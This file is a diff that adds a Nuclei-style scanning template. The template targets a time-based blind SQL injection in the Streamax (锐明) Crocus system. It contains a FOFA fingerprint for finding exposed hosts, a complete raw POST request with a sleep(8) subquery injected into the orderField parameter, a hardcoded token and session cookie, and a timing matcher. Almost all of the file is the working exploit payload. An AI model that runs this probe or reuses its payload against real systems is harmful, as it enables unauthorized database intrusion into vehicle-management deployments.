@@ -1,0 +1,41 @@
+id: poc-gzglgbk30bzalewo
+info:
+  name: 锐明Crocus系统存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzglgbk30bzalewo
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzglgbk30bzalewo
+    fofa: body="inp_verification"
+http:
+- raw:
+  - 'POST /RepairRecord.do?Action=QueryLast HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+    Accept: */*
+
+    Connection: close
+
+    Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
+
+    Content-Length: 218
+
+
+    EndTime=2024-06-19+23%3A59%3A59&FaultType=&Field=&GroupId=&PageIndex=0&PageSize=50&RepairState=-1&StartTime=2024-06-19+00%3A00%3A00&UserName=&Value=&VehicleId=&orderField=(select*from(select%0asleep(8))a)&orderType=asc'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
